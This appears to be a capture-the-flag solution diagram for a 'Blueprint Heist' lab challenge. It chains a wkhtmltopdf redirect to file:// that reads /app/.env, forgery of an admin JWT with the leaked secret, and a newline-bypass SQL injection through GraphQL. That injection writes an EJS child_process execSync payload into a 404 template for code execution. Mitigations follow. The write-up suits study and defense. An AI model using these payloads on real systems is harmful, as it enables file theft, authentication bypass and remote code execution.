@@ -1,0 +1,223 @@
+╔══════════════════════════════════════════════════════════════════════════╗
+║            BLUEPRINT HEIST - COMPLETE SOLUTION DIAGRAM                   ║
+╚══════════════════════════════════════════════════════════════════════════╝
+
+STEP 1: HTTP REDIRECT TRICK
+═══════════════════════════════════════════════════════════════════════════
+
+    Attacker                Your Server              Target Server
+       │                        │                          │
+       │  1. Host redirect.php  │                          │
+       │  ──────────────────>   │                          │
+       │                        │                          │
+       │  2. Send URL to target server                     │
+       │  ──────────────────────────────────────────────>  │
+       │     POST /download                                │
+       │     {"url":"http://yourserver/redirect.php?       │
+       │            file=/app/.env"}                       │
+       │                        │                          │
+       │                        │  3. wkhtmltopdf fetches  │
+       │                        │  <───────────────────────│
+       │                        │                          │
+       │                        │  4. Returns 302 Redirect │
+       │                        │     Location: file:///app/.env
+       │                        │  ─────────────────────>  │
+       │                        │                          │
+       │                        │     5. wkhtmltopdf       │
+       │                        │        reads local file  │
+       │                        │        ┌──────────┐      │
+       │                        │        │ /app/.env│      │
+       │                        │        └─────┬────┘      │
+       │                        │              │           │
+       │  6. Returns PDF with .env content     │           │
+       │  <──────────────────────────────────────────────  │
+       │                                                    │
+       └─> Extract JWT secret: IM_Sup3r_K3y_pl3ase_b3_c4r3ful?
+
+
+STEP 2: FORGE ADMIN TOKEN
+═══════════════════════════════════════════════════════════════════════════
+
+    ┌─────────────────────────────────────────────────────────┐
+    │ Original Guest Token                                     │
+    ├─────────────────────────────────────────────────────────┤
+    │ Header:  {"alg":"HS256","typ":"JWT"}                     │
+    │ Payload: {"role":"user","iat":1762776719}                │
+    │ Signature: [signed with secret]                          │
+    └─────────────────────────────────────────────────────────┘
+                           │
+                           │ Forge with known secret
+                           ↓
+    ┌─────────────────────────────────────────────────────────┐
+    │ Forged Admin Token                                       │
+    ├─────────────────────────────────────────────────────────┤
+    │ Header:  {"alg":"HS256","typ":"JWT"}                     │
+    │ Payload: {"role":"admin"}  ← Changed!                    │
+    │ Signature: [signed with IM_Sup3r_K3y_pl3ase_b3_c4r3ful?] │
+    └─────────────────────────────────────────────────────────┘
+
+
+STEP 3: SQL INJECTION WITH NEWLINE BYPASS
+═══════════════════════════════════════════════════════════════════════════
+
+Regex: /^.*[!#$%^&*()\-_=+{}\[\]\\|;:'\",.<>\/?]/
+       └─> Only checks first line! (. doesn't match \n)
+
+Normal Payload (BLOCKED):
+    test' UNION SELECT 1,2,3 -- -
+         ↑ Quote blocked by regex
+
+Bypass with Newline (WORKS):
+    test\n%' UNION SELECT 1,2,3 -- -
+         ↑↑ Newline! Regex only checks "test", ignores rest!
+
+GraphQL Query:
+    {
+      getDataByName(name: "test\n
+        %' UNION SELECT 1,
+        '<%= global.process.mainModule.require(\"child_process\").execSync(\"/readflag\") %>',
+        3 INTO OUTFILE '/app/views/errors/404.ejs' -- -") {
+        name
+      }
+    }
+
+
+STEP 4: TEMPLATE INJECTION CHAIN
+═══════════════════════════════════════════════════════════════════════════
+
+1. SQL Injection writes to filesystem:
+   ┌──────────────────────────────────────────┐
+   │ /app/views/errors/404.ejs (Created!)     │
+   ├──────────────────────────────────────────┤
+   │ <%= global.process.mainModule           │
+   │     .require("child_process")            │
+   │     .execSync("/readflag") %>            │
+   └──────────────────────────────────────────┘
+
+2. Access non-existent route:
+   GET /nonexistent → 404 Error
+
+3. Error handler logic:
+   ┌─────────────────────────────────────────┐
+   │ renderError(err, req, res) {            │
+   │   errorCode = 404                       │
+   │   templatePath = "views/errors/404.ejs" │
+   │                                         │
+   │   if (exists(templatePath)):            │
+   │     render(templatePath) ← EXECUTES EJS!│
+   │ }                                       │
+   └─────────────────────────────────────────┘
+
+4. EJS execution:
+   /readflag runs as root (SUID) → Outputs flag!
+
+
+COMPLETE ATTACK FLOW
+═══════════════════════════════════════════════════════════════════════════
+
+┌──────────┐
+│ Attacker │
+└─────┬────┘
+      │
+      │ 1. HTTP Redirect: Read .env
+      ↓
+┌──────────────────────┐
+│ Your Public Server   │
+│   redirect.php       │ ─────→ 302 to file:///app/.env
+└──────────────────────┘
+      ↓
+┌──────────────────────┐
+│ Target wkhtmltopdf   │
+│ Reads: /app/.env     │ ─────→ Returns in PDF
+└──────────────────────┘
+      ↓
+┌──────────────────────┐
+│ Extract JWT Secret   │
+│ IM_Sup3r_K3y...      │
+└──────────────────────┘
+      ↓
+┌──────────────────────┐
+│ Forge Admin Token    │
+│ role: admin          │
+└──────────────────────┘
+      ↓
+┌──────────────────────┐
+│ SSRF to GraphQL      │
+│ via localhost        │
+└──────────────────────┘
+      ↓
+┌──────────────────────┐
+│ SQL Injection        │
+│ WITH Newline Bypass  │
+└──────────────────────┘
+      ↓
+┌──────────────────────┐
+│ Write 404.ejs        │
+│ with EJS payload     │
+└──────────────────────┘
+      ↓
+┌──────────────────────┐
+│ Trigger 404 Error    │
+│ Access /nonexistent  │
+└──────────────────────┘
+      ↓
+┌──────────────────────┐
+│ EJS Executes         │
+│ /readflag runs       │
+└──────────────────────┘
+      ↓
+┌──────────────────────┐
+│  🎉 GET FLAG! 🎉     │
+│  HTB{...}            │
+└──────────────────────┘
+
+
+KEY VULNERABILITIES
+═══════════════════════════════════════════════════════════════════════════
+
+1. ⚠️  wkhtmltopdf follows HTTP redirects to file:// (CVE-2020-21365)
+2. ⚠️  JWT secret stored in readable .env file
+3. ⚠️  Regex bypass with newline (\n character)
+4. ⚠️  SQL injection in GraphQL query
+5. ⚠️  MySQL INTO OUTFILE allows arbitrary file write
+6. ⚠️  EJS template allows arbitrary code execution
+7. ⚠️  SUID /readflag binary executes as root
+
+
+MITIGATIONS
+═══════════════════════════════════════════════════════════════════════════
+
+✅ Use --disable-local-file-access for wkhtmltopdf
+✅ Don't follow redirects to non-HTTP protocols
+✅ Use environment variables, not .env files in production
+✅ Rotate JWT secrets regularly
+✅ Use multiline mode for regex: /^.*[...]$/m
+✅ Use parameterized queries, never string interpolation
+✅ Restrict MySQL file write permissions
+✅ Validate and sanitize template content
+✅ Don't allow user-controlled template paths
+✅ Minimize SUID binaries, use capabilities instead
+
+
+TOOLS REQUIRED
+═══════════════════════════════════════════════════════════════════════════
+
+✔ curl / wget               - HTTP requests
+✔ Python3 + PyJWT           - JWT token manipulation
+✔ pdftotext                 - PDF text extraction
+✔ PHP                       - Redirect server
+✔ ngrok / VPS / Cloud Fn    - Public server hosting
+✔ Basic shell scripting     - Automation
+
+
+LEARNING POINTS
+═══════════════════════════════════════════════════════════════════════════
+
+📚 SSRF can bypass localhost restrictions
+📚 HTTP redirects can change protocols
+📚 Regex metacharacters behavior (. vs \n)
+📚 SQL injection file write techniques
+📚 Template engine security
+📚 JWT token forgery
+📚 Vulnerability chaining
+📚 SUID binary exploitation
